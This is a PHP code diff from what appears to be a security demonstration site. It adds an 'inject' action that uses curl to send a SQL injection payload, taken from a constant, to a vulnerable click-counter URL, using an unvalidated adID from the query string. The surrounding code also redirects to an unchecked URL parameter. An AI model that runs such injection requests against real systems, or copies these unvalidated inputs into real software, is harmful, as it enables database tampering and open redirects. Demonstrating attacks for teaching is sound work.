@@ -37,7 +37,8 @@ class main
             $this->redirect($_GET['url'], 303);
         }
         else if (isset($_GET['ac']) && $_GET['ac'] == "inject") {
-            $this->inject();
+            $this->inject($_GET['adID']);
+            echo "<script type='text/javascript'>alert('SQL injection')</script>";
         }
         $view = new SiteTestView();
         
@@ -118,16 +119,18 @@ class main
     }
     
     /**
-    * Perform SQL injection    *
+    * Perform SQL injection
+    * Demonstrate how to attack using SQL injection
+    * Increment number of clicks for news item to 10000 if success
     */
-    function inject()
+    function inject($adID)
     {
         $curl = curl_init();
-        $url = INCRE_VUL.SQL;
+        $url = INCRE_VUL.$adID.rawurlencode(SQL);
         curl_setopt($curl, CURLOPT_URL, $url);
         curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
         $result = curl_exec($curl);
-         curl_close($curl);
+        curl_close($curl);
     }
 }
 ?>
